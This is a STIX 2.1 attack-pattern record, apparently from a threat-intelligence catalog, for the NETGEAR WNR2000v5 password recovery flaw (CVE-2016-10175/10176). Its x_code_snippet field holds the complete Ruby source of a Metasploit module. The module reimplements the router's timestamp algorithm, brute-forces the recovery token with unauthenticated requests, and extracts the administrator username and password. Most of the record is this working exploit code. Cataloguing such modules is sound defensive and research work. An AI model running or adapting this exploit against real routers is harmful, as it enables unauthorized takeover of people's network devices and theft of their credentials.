{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--94ba8d94-4876-4bf4-91d6-f2d7a4d955d8",
    "created": "2024-08-14T16:24:03.166813Z",
    "modified": "2024-08-14T16:24:03.166818Z",
    "name": "NETGEAR WNR2000v5 Administrator Password Recovery",
    "description": " The NETGEAR WNR2000 router has a vulnerability in the way it handles password recovery. This vulnerability can be exploited by an unauthenticated attacker who is able to guess the value of a certain timestamp which is in the configuration of the router. Brute forcing the timestamp token might take a few minutes, a few hours, or days, but it is guaranteed that it can be bruteforced. This module works very reliably and it has been tested with the WNR2000v5, firmware versions 1.0.0.34 and 1.0.0.18. It should also work with the hardware revisions v4 and v3, but this has not been tested. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/netgear_wnr2000_pass_recovery.rb",
            "external_id": "netgear_wnr2000_pass_recovery.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-10175"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-10176"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear-wnr2000.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2016/Dec/72"
        },
        {
            "source_name": "reference",
            "url": "https://kb.netgear.com/000036549/Insecure-Remote-Access-and-Command-Execution-Security-Vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'time'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::CRand\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'NETGEAR WNR2000v5 Administrator Password Recovery',\n        'Description' => %q{\n          The NETGEAR WNR2000 router has a vulnerability in the way it handles password recovery.\n          This vulnerability can be exploited by an unauthenticated attacker who is able to guess\n          the value of a certain timestamp which is in the configuration of the router.\n          Brute forcing the timestamp token might take a few minutes, a few hours, or days, but\n          it is guaranteed that it can be bruteforced.\n          This module works very reliably and it has been tested with the WNR2000v5, firmware versions\n          1.0.0.34 and 1.0.0.18. It should also work with the hardware revisions v4 and v3, but this\n          has not been tested.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2016-10175'],\n          ['CVE', '2016-10176'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/netgear-wnr2000.txt'],\n          ['URL', 'https://seclists.org/fulldisclosure/2016/Dec/72'],\n          ['URL', 'https://kb.netgear.com/000036549/Insecure-Remote-Access-and-Command-Execution-Security-Vulnerability']\n        ],\n        'DisclosureDate' => '2016-12-20'\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80)\n      ]\n    )\n    register_advanced_options(\n      [\n        OptInt.new('TIME_OFFSET', [true, 'Maximum time differential to try', 5000]),\n        OptInt.new('TIME_SURPLUS', [true, 'Increase this if you are sure the device is vulnerable and you are not getting through', 200])\n      ]\n    )\n  end\n\n  def get_current_time\n    res = send_request_cgi({\n      'uri' => '/',\n      'method' => 'GET'\n    })\n    if res && res['Date']\n      date = res['Date']\n      return Time.parse(date).strftime('%s').to_i\n    end\n  end\n\n  # Do some crazyness to force Ruby to cast to a single-precision float and\n  # back to an integer.\n  # This emulates the behaviour of the soft-fp library and the float cast\n  # which is done at the end of Netgear's timestamp generator.\n  def ieee754_round(number)\n    [number].pack('f').unpack('f*')[0].to_i\n  end\n\n  # This is the actual algorithm used in the get_timestamp function in\n  # the Netgear firmware.\n  def get_timestamp(time)\n    srandom_r time\n    t0 = random_r\n    t1 = 0x17dc65df\n    hi = (t0 * t1) >> 32\n    t2 = t0 >> 31\n    t3 = hi >> 23\n    t3 -= t2\n    t4 = t3 * 0x55d4a80\n    t0 -= t4\n    t0 += 0x989680\n\n    ieee754_round(t0)\n  end\n\n  def get_creds\n    res = send_request_cgi({\n      'uri' => '/BRS_netgear_success.html',\n      'method' => 'GET'\n    })\n    if res && res.body =~ /var sn=\"(\\w*)\";/\n      serial = ::Regexp.last_match(1)\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to obtain serial number, bailing out...\")\n    end\n\n    # 1: send serial number\n    send_request_cgi({\n      'uri' => '/apply_noauth.cgi',\n      'query' => '/unauth.cgi',\n      'method' => 'POST',\n      'Content-Type' => 'application/x-www-form-urlencoded',\n      'vars_post' =>\n      {\n        'submit_flag' => 'match_sn',\n        'serial_num' => serial,\n        'continue' => '+Continue+'\n      }\n    })\n\n    # 2: send answer to secret questions\n    send_request_cgi({\n      'uri' => '/apply_noauth.cgi',\n      'query' => '/securityquestions.cgi',\n      'method' => 'POST',\n      'Content-Type' => 'application/x-www-form-urlencoded',\n      'vars_post' =>\n      {\n        'submit_flag' => 'security_question',\n        'answer1' => @q1,\n        'answer2' => @q2,\n        'continue' => '+Continue+'\n      }\n    })\n\n    # 3: PROFIT!!!\n    res = send_request_cgi({\n      'uri' => '/passwordrecovered.cgi',\n      'method' => 'GET'\n    })\n\n    if res && res.body =~ %r{Admin Password: (.*)</TD>}\n      password = ::Regexp.last_match(1)\n      if password.blank?\n        fail_with(Failure::Unknown, \"#{peer} - Failed to obtain password! Perhaps security questions were already set?\")\n      end\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to obtain password\")\n    end\n\n    if res && res.body =~ %r{Admin Username: (.*)</TD>}\n      username = ::Regexp.last_match(1)\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to obtain username\")\n    end\n\n    return [username, password]\n  end\n\n  def send_req(timestamp)\n    query_str = (if timestamp.nil?\n                   '/PWD_password.htm'\n                 else\n                   \"/PWD_password.htm%20timestamp=#{timestamp}\"\n                 end)\n    res = send_request_raw({\n      'uri' => '/apply_noauth.cgi',\n      'query' => query_str,\n      'method' => 'POST',\n      'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },\n      'data' => \"submit_flag=passwd&hidden_enable_recovery=1&Apply=Apply&sysOldPasswd=&sysNewPasswd=&sysConfirmPasswd=&enable_recovery=on&question1=1&answer1=#{@q1}&question2=2&answer2=#{@q2}\"\n    })\n    return res\n  rescue ::Errno::ETIMEDOUT, ::Errno::ECONNRESET, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n    return\n  end\n\n  def run\n    # generate the security questions\n    @q1 = Rex::Text.rand_text_alpha(rand(2..21))\n    @q2 = Rex::Text.rand_text_alpha(rand(2..21))\n\n    # let's try without timestamp first (the timestamp only gets set if the user visited the page before)\n    print_status(\"#{peer} - Trying the easy way out first\")\n    res = send_req(nil)\n    if res && res.code == 200\n      credentials = get_creds\n      print_good(\"#{peer} - Success! Got admin username \\\"#{credentials[0]}\\\" and password \\\"#{credentials[1]}\\\"\")\n      return\n    end\n\n    # no result? let's just go on and bruteforce the timestamp\n    print_error(\"#{peer} - Well that didn't work... let's do it the hard way.\")\n\n    # get the current date from the router and parse it\n    end_time = get_current_time\n    if end_time.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Unable to obtain current time\")\n    end\n    if end_time <= datastore['TIME_OFFSET']\n      start_time = 0\n    else\n      start_time = end_time - datastore['TIME_OFFSET']\n    end\n    end_time += datastore['TIME_SURPLUS']\n\n    if end_time < (datastore['TIME_SURPLUS'] * 7.5).to_i\n      end_time = (datastore['TIME_SURPLUS'] * 7.5).to_i\n    end\n\n    print_good(\"#{peer} - Got time #{end_time} from router, starting exploitation attempt.\")\n    print_status(\"#{peer} - Be patient, this might take a long time (typically a few minutes, but it might take hours).\")\n\n    # work back from the current router time minus datastore['TIME_OFFSET']\n    loop do\n      for time in end_time.downto(start_time)\n        timestamp = get_timestamp(time)\n        sleep 0.1\n        if time % 400 == 0\n          print_status(\"#{peer} - Still working, trying time #{time}\")\n        end\n        res = send_req(timestamp)\n        next unless res && res.code == 200\n\n        credentials = get_creds\n        print_good(\"#{peer} - Success! Got admin username \\\"#{credentials[0]}\\\" and password \\\"#{credentials[1]}\\\"\")\n        store_valid_credential(user: credentials[0], private: credentials[1]) # more consistent service_name and protocol, now supplies ip and port\n        return\n      end\n      end_time = start_time\n      start_time -= datastore['TIME_OFFSET']\n      if start_time < 0\n        if end_time <= datastore['TIME_OFFSET']\n          fail_with(Failure::Unknown, \"#{peer} - Exploit failed\")\n        end\n        start_time = 0\n      end\n      print_status(\"#{peer} - Going for another round, finishing at #{start_time} and starting at #{end_time}\")\n\n      # let the router clear the buffers a bit...\n      sleep 30\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-12-20"
}